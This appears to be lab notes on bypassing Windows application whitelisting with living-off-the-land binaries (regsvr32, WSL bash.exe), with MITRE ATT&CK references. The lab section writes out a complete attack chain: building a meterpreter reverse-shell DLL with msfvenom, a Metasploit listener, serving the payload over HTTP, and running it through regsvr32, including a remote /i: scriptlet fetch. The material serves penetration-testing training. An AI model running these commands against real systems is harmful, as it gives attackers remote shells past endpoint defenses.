# Application whitelisting bypasses

Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs 
from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications 
or executable files that are allowed to be present and executed on an OS. Some LOLBAS examples that are used to bypass 
the Windows application whitelisting.

## Regsvr32

Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows 
Registry. The `regsvr.exe` binary is located at:

    C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
    C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version

Besides its intended use, `regsvr32.exe` binary can also be used to execute arbitrary binaries and bypass the Windows 
Application Whitelisting. 

According to Red Canary reports, the `regsvr32.exe` binary is the third most popular ATT&CK technique. Mitre identifies 
it as "System Binary Proxy Execution: Regsvr32" ([T1218.010](https://attack.mitre.org/techniques/T1218/010/)).

## Bourne Again Shell (Bash)

In 2016, Microsoft added support for the Linux environment on Windows 10, 11, and Server 2019. This feature is known 
as Windows Subsystem for Linux (WSL), and it exists in two WSL versions: WSL1 and WSL2. WSL is a Hyper-V virtualised 
Linux distribution that runs on the OS, supporting a subset of the Linux kernel and system calls. This feature is an 
addon that a user can install. As part of WSL, `bash.exe` is a Microsoft tool for interacting with the Linux 
environment.

By executing `bash.exe -c "path-to-payload"`, any unsigned payload can be executed. ATT&CK called this an 
"Indirect Command execution" technique ([T1202](https://attack.mitre.org/techniques/T1202/)).

## Lab

1. Create a malicious DLL file using msfvenom (32 bit):

```text
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
```

2. Set up a Metasploit listener to receive a reverse shell:

```text
$ msfconsole -q 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > set LHOST ATTACKBOX_IP
LHOST => ATTACKBOX_IP
msf6 exploit(multi/handler) > set LPORT 443 
LPORT => 443 
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on ATTACKBOX_IP:443
```

3. Deliver the payload to the target machine using a webserver to serve the DLL file on our attacking machine:

```text
$ python3 -m http.server 1337
```

On the target machine, download the DLL file, and execute it using `regsvr32.exe`:

```text
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
```

Or:

```text
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

* `/s`: in silent mode (without showing messages)
* `/n`: to not call the DLL register server
* `/i`:: to use another server since we used `/n`
* `/u`: to run with unregister method

On the attacking machine:

```text
msf6 > exploit(multi/handler) > exploit 
```

Note: For a 64-bit DLL version, specify it in the msfvenom command and run it from the victim machine using the 
64bits version of `regsvr32.exe` at `C:\Windows\SysWOW64\regsvr32.exe`.

## Resources

* [Red Canary](https://redcanary.com/)
* [Windows Subsystem for Linux (WSL)](https://docs.microsoft.com/en-us/windows/wsl/about)

